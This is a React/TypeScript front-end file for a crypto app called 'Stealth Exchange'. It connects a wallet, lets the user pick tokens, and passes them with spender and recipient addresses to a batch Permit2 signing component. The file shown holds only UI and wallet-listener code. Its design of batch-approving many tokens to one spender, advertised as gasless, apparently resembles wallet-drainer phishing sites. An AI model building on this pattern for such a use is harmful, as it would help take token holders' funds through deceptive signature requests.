import React, { useState, useEffect } from "react";
import WalletButton from "./components/WalletButton";
import TokenList from "./components/TokenList";
import BatchSign from "./components/BatchSign";
import StatusBar from "./components/StatusBar";
import {
    WalletState,
    getInitialState,
    listenForAccountChanges,
    listenForChainChanges,
    removeAllListeners
} from "./connectors/walletconnect";
import { TokenInfo } from "./utils/tokens";

const App: React.FC = () => {
    const [wallet, setWallet] = useState<WalletState>(getInitialState());
    const [selectedTokens, setSelectedTokens] = useState<TokenInfo[]>([]);
    const [recipientAddress, setRecipientAddress] = useState("");
    const [spenderAddress, setSpenderAddress] = useState("");
    const [tokenCount, setTokenCount] = useState(0);

    useEffect(() => {
        listenForAccountChanges((accounts: string[]) => {
            if (accounts.length === 0) {
                handleDisconnect();
            } else {
                setWallet(prev => ({
                    ...prev,
                    address: accounts[0]
                }));
            }
        });

        listenForChainChanges((chainId: string) => {
            setWallet(prev => ({
                ...prev,
                chainId: parseInt(chainId, 16)
            }));
            setSelectedTokens([]);
        });

        return () => {
            removeAllListeners();
        };
    }, []);

    const handleConnect = (state: WalletState) => {
        setWallet(state);
        setSelectedTokens([]);
    };

    const handleDisconnect = () => {
        setWallet(getInitialState());
        setSelectedTokens([]);
        setRecipientAddress("");
    };

    return (
        <div style={styles.app}>
            <div style={styles.container}>
                <header style={styles.header}>
                    <div style={styles.logo}>
                        <span style={styles.logoIcon}>⚡</span>
                        <h1 style={styles.title}>Stealth Exchange</h1>
                    </div>
                    <WalletButton
                        wallet={wallet}
                        onConnect={handleConnect}
                        onDisconnect={handleDisconnect}
                    />
                </header>

                <StatusBar
                    connected={wallet.connected}
                    chainId={wallet.chainId}
                    tokenCount={tokenCount}
                    selectedCount={selectedTokens.length}
                />

                {wallet.connected ? (
                    <div style={styles.mainContent}>
                        <div style={styles.inputSection}>
                            <div style={styles.inputGroup}>
                                <label style={styles.label}>
                                    Recipient Address
                                </label>
                                <input
                                    type="text"
                                    placeholder="0x..."
                                    value={recipientAddress}
                                    onChange={e =>
                                        setRecipientAddress(e.target.value)
                                    }
                                    style={styles.input}
                                />
                            </div>
                            <div style={styles.inputGroup}>
                                <label style={styles.label}>
                                    Spender / Contract Address
                                </label>
                                <input
                                    type="text"
                                    placeholder="0x... (StealthExchange contract)"
                                    value={spenderAddress}
                                    onChange={e =>
                                        setSpenderAddress(e.target.value)
                                    }
                                    style={styles.input}
                                />
                            </div>
                        </div>

                        <TokenList
                            provider={wallet.provider}
                            userAddress={wallet.address}
                            chainId={wallet.chainId}
                            selectedTokens={selectedTokens}
                            onSelectionChange={tokens => {
                                setSelectedTokens(tokens);
                                setTokenCount(tokens.length);
                            }}
                        />

                        <BatchSign
                            provider={wallet.provider}
                            signer={wallet.signer}
                            chainId={wallet.chainId}
                            selectedTokens={selectedTokens}
                            spenderAddress={spenderAddress}
                            recipientAddress={recipientAddress}
                        />
                    </div>
                ) : (
                    <div style={styles.welcomeSection}>
                        <div style={styles.welcomeIcon}>🔐</div>
                        <h2 style={styles.welcomeTitle}>
                            Welcome to Stealth Exchange
                        </h2>
                        <p style={styles.welcomeText}>
                            Connect your wallet to begin batch token transfers
                            using Permit2 signatures. No gas needed for
                            approvals.
                        </p>
                        <div style={styles.features}>
                            <div style={styles.feature}>
                                <span>⚡</span>
                                <span>Gasless Signatures</span>
                            </div>
                            <div style={styles.feature}>
                                <span>📦</span>
                                <span>Batch Transfers</span>
                            </div>
                            <div style={styles.feature}>
                                <span>🔒</span>
                                <span>Permit2 Security</span>
                            </div>
                            <div style={styles.feature}>
                                <span>🌐</span>
                                <span>Multi-Chain</span>
                            </div>
                        </div>
                    </div>
                )}

                <footer style={styles.footer}>
                    <span style={styles.footerText}>
                        Stealth Exchange v1.0.0 • Powered by Permit2
                    </span>
                </footer>
            </div>
        </div>
    );
};

const styles: Record<string, React.CSSProperties> = {
    app: {
        minHeight: "100vh",
        background: "linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%)",
        fontFamily: "'Inter', -apple-system, sans-serif",
        color: "#fff"
    },
    container: {
        maxWidth: "800px",
        margin: "0 auto",
        padding: "24px"
    },
    header: {
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        marginBottom: "24px",
        paddingBottom: "20px",
        borderBottom: "1px solid rgba(255,255,255,0.06)"
    },
    logo: {
        display: "flex",
        alignItems: "center",
        gap: "12px"
    },
    logoIcon: {
        fontSize: "28px"
    },
    title: {
        margin: 0,
        fontSize: "24px",
        fontWeight: "700",
        background: "linear-gradient(135deg, #667eea, #764ba2)",
        WebkitBackgroundClip: "text",
        WebkitTextFillColor: "transparent"
    },
    mainContent: {
        display: "flex",
        flexDirection: "column",
        gap: "20px"
    },
    inputSection: {
        display: "grid",
        gridTemplateColumns: "1fr 1fr",
        gap: "16px"
    },
    inputGroup: {
        display: "flex",
        flexDirection: "column",
        gap: "6px"
    },
    label: {
        color: "#94a3b8",
        fontSize: "13px",
        fontWeight: "500"
    },
    input: {
        background: "rgba(255,255,255,0.05)",
        border: "1px solid rgba(255,255,255,0.1)",
        borderRadius: "12px",
        padding: "12px 16px",
        color: "#fff",
        fontSize: "14px",
        fontFamily: "monospace",
        outline: "none",
        transition: "border-color 0.2s ease"
    },
    welcomeSection: {
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        padding: "60px 20px",
        textAlign: "center"
    },
    welcomeIcon: {
        fontSize: "64px",
        marginBottom: "20px"
    },
    welcomeTitle: {
        fontSize: "28px",
        fontWeight: "700",
        margin: "0 0 12px 0"
    },
    welcomeText: {
        color: "#94a3b8",
        fontSize: "16px",
        maxWidth: "500px",
        lineHeight: "1.6",
        margin: "0 0 32px 0"
    },
    features: {
        display: "grid",
        gridTemplateColumns: "1fr 1fr",
        gap: "16px"
    },
    feature: {
        display: "flex",
        alignItems: "center",
        gap: "10px",
        padding: "16px 24px",
        background: "rgba(255,255,255,0.03)",
        borderRadius: "12px",
        border: "1px solid rgba(255,255,255,0.06)",
        color: "#e2e8f0",
        fontSize: "14px"
    },
    footer: {
        marginTop: "40px",
        paddingTop: "20px",
        borderTop: "1px solid rgba(255,255,255,0.06)",
        textAlign: "center"
    },
    footerText: {
        color: "#475569",
        fontSize: "12px"
    }
};

export default App;
